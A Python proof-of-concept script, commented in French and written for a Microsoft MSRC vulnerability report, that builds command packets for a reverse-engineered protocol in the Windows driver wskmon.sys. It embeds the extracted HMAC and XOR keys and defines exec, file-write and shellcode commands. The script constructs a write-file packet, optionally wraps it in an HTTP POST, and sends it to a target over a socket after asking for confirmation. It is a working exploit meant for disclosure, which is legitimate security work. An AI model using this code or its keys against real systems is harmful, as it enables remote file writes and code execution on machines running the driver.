#!/usr/bin/env python3
"""
PoC de construction de paquet pour wskmon.sys — preuve d'exploitabilite pour le
signalement MSRC (thumbprint certificat 2e8072ded075c6b6c0df8c364e9d12319577114991f2455ebc4b364b367f7dba).

Implemente le protocole reverse-engineere en analyse statique :
  MAGIC(4) | CMD(1) | HMAC-SHA256(32) | LEN_BE(4) | payload_xor(LEN)

  - HMAC = HMAC-SHA256(cle, octet_commande || payload_xor)   [BCryptHashData x2, verifie dans le desassemblage]
  - payload_xor = payload en clair XOR cle_rotative_32_octets

A N'UTILISER que contre une instance de test que vous controlez (VM de labo avec
le driver charge volontairement pour validation) — jamais contre un tiers.
Ce script construit et affiche le paquet ; il ne l'envoie nulle part par defaut.

Analyste : Gordon PEIRS — juillet 2026
"""
import argparse
import hmac
import hashlib
import socket
import struct
import sys

MAGIC = bytes.fromhex("7F4E5446")

# Cle secrete HMAC, extraite a 0x140005558 (pbSecret passe a BCryptCreateHash
# dans fcn.140001bf0) — DISTINCTE de la cle XOR, confirmee par desassemblage :
# lea rax,[0x140005558] ; mov dword [cbSecret], 0x20 ; call BCryptCreateHash
HMAC_KEY = bytes.fromhex(
    "a3915bd70e62c4883f1a7de650b92cf5"
    "6e8347da15ac790bc15834ef962d4a71"
)

# Cle XOR du payload, extraite a 0x140005470 (table indexee par `and eax, 0x1f`)
XOR_KEY = bytes.fromhex(
    "d2478a1ef36bc09554" "29e73d81af660cb8721fe4439d5e28a60d73c93b84f152".replace(" ", "")
)

CMD_EXEC = 1
CMD_WRITE_FILE = 2
CMD_SHELLCODE = 3


def xor_encrypt(data: bytes, key: bytes = XOR_KEY) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def build_write_file_payload(path: str, content: bytes) -> bytes:
    """Format confirme dans fcn.1400027f0 :
    [longueur_chemin: 2 octets BE][chemin: UTF-8][contenu du fichier]"""
    path_bytes = path.encode("utf-8")
    if len(path_bytes) > 0xFFFF:
        raise ValueError("chemin trop long")
    return struct.pack(">H", len(path_bytes)) + path_bytes + content


def build_packet(cmd: int, payload_plain: bytes, hmac_key: bytes = HMAC_KEY) -> bytes:
    payload_xor = xor_encrypt(payload_plain)
    cmd_byte = bytes([cmd])
    mac = hmac.new(hmac_key, cmd_byte + payload_xor, hashlib.sha256).digest()
    length = struct.pack(">I", len(payload_xor))
    return MAGIC + cmd_byte + mac + length + payload_xor


def wrap_http_post(packet: bytes, host: str = "127.0.0.1", path: str = "/") -> bytes:
    """Encapsule le paquet dans le corps d'une requete HTTP POST — deuxieme
    declencheur confirme (scan des 1024 premiers octets du corps)."""
    body = packet
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("ascii") + body
    return req


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", help="IP:port d'une instance de LABO a tester (jamais un tiers)")
    ap.add_argument("--mode", choices=["raw", "http"], default="raw")
    ap.add_argument("--marker-path", default=r"C:\Windows\Temp\wskmon_poc_marker.txt")
    ap.add_argument("--marker-content", default=b"wskmon.sys PoC - MSRC report - Gordon PEIRS\r\n")
    args = ap.parse_args()

    payload = build_write_file_payload(args.marker_path, args.marker_content)
    packet = build_packet(CMD_WRITE_FILE, payload)

    print(f"[+] Paquet construit : {len(packet)} octets")
    print(f"    magic  = {packet[:4].hex()}")
    print(f"    cmd    = {packet[4]}")
    print(f"    hmac   = {packet[5:37].hex()}")
    print(f"    length = {int.from_bytes(packet[37:41], 'big')}")
    print(f"    payload (xor) = {packet[41:].hex()[:64]}...")

    if args.mode == "http":
        packet = wrap_http_post(packet)
        print(f"[+] Encapsule en requete HTTP POST ({len(packet)} octets)")

    if not args.target:
        print("\n[*] Pas de --target fourni : paquet affiche seulement, rien envoye.")
        print("    Sortie brute (hex) :")
        print(packet.hex())
        return

    host, _, port = args.target.partition(":")
    port = int(port) if port else 80
    print(f"\n[!] Envoi vers {host}:{port} — confirmez que c'est bien un environnement de test que vous controlez.")
    confirm = input("    Taper 'OUI' pour confirmer : ")
    if confirm != "OUI":
        print("Annule.")
        return

    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(packet)
        print("[+] Paquet envoye.")


if __name__ == "__main__":
    main()
